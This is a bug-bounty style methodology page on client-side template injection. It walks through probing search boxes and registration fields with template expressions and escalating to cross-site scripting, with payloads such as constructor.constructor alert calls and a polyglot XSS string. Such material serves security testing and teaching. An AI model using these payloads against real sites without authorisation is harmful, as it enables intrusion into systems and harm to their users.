# Client Side Template Injection

## Check List

## Methodology

### Black Box

#### Search Box

{% stepper %}
{% step %}
Go to any search box on the target&#x20;
{% endstep %}

{% step %}
Enter this exact payload in the input field

```java
{{7*7}}
```
{% endstep %}

{% step %}
Submit the form or trigger the search
{% endstep %}

{% step %}
Check the response or rendered page
{% endstep %}

{% step %}
If you see 49, Client-Side Template Injection (CSTI) CONFIRMED
{% endstep %}

{% step %}
Escalate immediately with this XSS payload

```javascript
{{constructor.constructor('alert(document.domain)')()}}
```
{% endstep %}

{% step %}
If alert pops, Full XSS via CSTI, CONFIRMED

of

```javascript
javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert(document.domain)//>
```
{% endstep %}
{% endstepper %}

***

#### CSTI in the registration process

{% stepper %}
{% step %}
Log in to the target site and complete the account creation process
{% endstep %}

{% step %}
Then trace the request process using Burp Suite
{% endstep %}

{% step %}
In the intercepted request from the account creation process, replace and fill in the username form using the payload below and submit the request

```javascript
“>{{7*7}}<img>
```
{% endstep %}

{% step %}
After creating the account, if the username field contains 49, the vulnerability is confirmed
{% endstep %}

{% step %}
Then we can convert this vulnerability to XSS using the following command

```javascript
{{constructor.constructor(‘alert(`XSS`)’)()}}
```
{% endstep %}
{% endstepper %}

***

### White Box

## Cheat Sheet
